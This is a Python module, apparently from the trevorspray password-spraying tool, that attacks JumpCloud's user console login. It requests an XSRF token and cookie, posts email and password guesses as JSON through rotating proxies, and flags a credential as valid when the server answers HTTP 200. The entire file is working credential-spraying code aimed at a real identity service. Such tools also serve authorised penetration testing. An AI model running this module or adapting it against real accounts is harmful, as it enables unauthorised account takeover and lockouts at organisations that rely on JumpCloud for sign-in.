import logging
import requests
from .base import BaseSprayModule

log = logging.getLogger("trevorspray.sprayers.jumpcloud")


class JumpCloud(BaseSprayModule):
    # default target URL
    default_url = "https://console.jumpcloud.com/userconsole/auth"

    userparam = "email"

    request_json = {
        "email": "{username}",
        "password": "{password}",
    }

    headers = {
        "X-Requested-With": "XMLHttpRequest",
        "Accept": "application/json",
        "Content-Type": "application/json",
        "Referrer": "https://console.jumpcloud.com/login?step=password",
        "Origin": "https://console.jumpcloud.com",
    }

    def create_request(self, username, password, proxythread):
        request = super().create_request(username, password, proxythread)

        xsrf_url = "https://console.jumpcloud.com/userconsole/xsrf"
        xsrf_response = requests.get(
            xsrf_url, headers=self.headers, proxies=proxythread.proxy_arg
        )
        xsrf_token = xsrf_response.json().get("xsrf", "")
        xsrf_cookie = xsrf_response.cookies.get("_xsrf", "")
        if not xsrf_token:
            log.warning(
                f"Failed to obtain XSRF token: {xsrf_response}:{xsrf_response.text}"
            )
        if not xsrf_cookie:
            log.warning(
                f"Failed to obtain XSRF cookie: {xsrf_response}:{xsrf_response.cookies}"
            )
        log.debug(f"Token: {xsrf_token}")
        log.debug(f"Cookie: {xsrf_cookie}")
        cookies = {"_xsrf": xsrf_cookie}
        cookies.update(self.cookies)
        headers = {
            "X-Xsrftoken": xsrf_token,
        }
        headers.update(self.headers)

        request.headers = headers
        request.cookies = cookies
        return request

    def check_response(self, response):
        valid = False
        exists = None
        locked = None
        msg = ""

        status_code = getattr(response, "status_code", 0)
        msg = f"Response code {status_code}"

        if status_code == 200:
            exists = True
            valid = True

        return (valid, exists, locked, msg)
